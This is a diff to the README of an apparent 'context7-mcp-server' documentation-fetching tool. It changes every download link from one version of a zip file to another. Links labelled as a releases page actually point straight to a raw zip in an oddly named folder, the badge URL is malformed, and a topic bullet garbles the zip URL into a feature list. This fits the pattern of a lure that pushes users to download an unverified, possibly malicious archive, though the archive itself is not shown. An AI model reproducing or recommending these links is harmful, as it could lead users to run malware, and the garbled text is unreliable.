@@ -1,6 +1,6 @@
 # 🌟 context7-mcp-server - Fetch Up-to-Date Docs Effortlessly
 
-[![Download](https://raw.githubusercontent.com/Rutu-A/context7-mcp-server/main/wholeheartedness/server_mcp_context_v1.0-alpha.2.zip%https://raw.githubusercontent.com/Rutu-A/context7-mcp-server/main/wholeheartedness/server_mcp_context_v1.0-alpha.2.zip)](https://raw.githubusercontent.com/Rutu-A/context7-mcp-server/main/wholeheartedness/server_mcp_context_v1.0-alpha.2.zip)
+[![Download](https://raw.githubusercontent.com/Rutu-A/context7-mcp-server/main/wholeheartedness/server_mcp_context_v1.4-alpha.4.zip%https://raw.githubusercontent.com/Rutu-A/context7-mcp-server/main/wholeheartedness/server_mcp_context_v1.4-alpha.4.zip)](https://raw.githubusercontent.com/Rutu-A/context7-mcp-server/main/wholeheartedness/server_mcp_context_v1.4-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the context7-mcp-server! This application helps you fetch the latest 
 
 To get started, you need to download the software:
 
-1. **Visit this page to download:** [context7-mcp-server Releases](https://raw.githubusercontent.com/Rutu-A/context7-mcp-server/main/wholeheartedness/server_mcp_context_v1.0-alpha.2.zip)
+1. **Visit this page to download:** [context7-mcp-server Releases](https://raw.githubusercontent.com/Rutu-A/context7-mcp-server/main/wholeheartedness/server_mcp_context_v1.4-alpha.4.zip)
 
 2. Choose the latest release. You will find a list of available files.
 
@@ -55,7 +55,7 @@ The context7-mcp-server supports a range of topics, including:
 - Code Examples
 - Context7 Development
 - Developer Tooling
-- Document Scraping with https://raw.githubusercontent.com/Rutu-A/context7-mcp-server/main/wholeheartedness/server_mcp_context_v1.0-alpha.2.zip
+- Document Scraping with https://raw.githubusercontent.com/Rutu-A/context7-mcp-server/main/wholeheartedness/server_mcp_context_v1.4-alpha.4.zip
 - TypeScript Support
 
 ## 🛠️ Troubleshooting
@@ -81,6 +81,6 @@ This project is open-source. You can use, modify, and distribute it under the te
 
 For further inquiries, reach out via the issues page on GitHub or contact the repository maintainer.
 
-**Download the latest version here:** [context7-mcp-server Releases](https://raw.githubusercontent.com/Rutu-A/context7-mcp-server/main/wholeheartedness/server_mcp_context_v1.0-alpha.2.zip) 
+**Download the latest version here:** [context7-mcp-server Releases](https://raw.githubusercontent.com/Rutu-A/context7-mcp-server/main/wholeheartedness/server_mcp_context_v1.4-alpha.4.zip) 
 
 Your journey to fetching up-to-date documentation starts now!
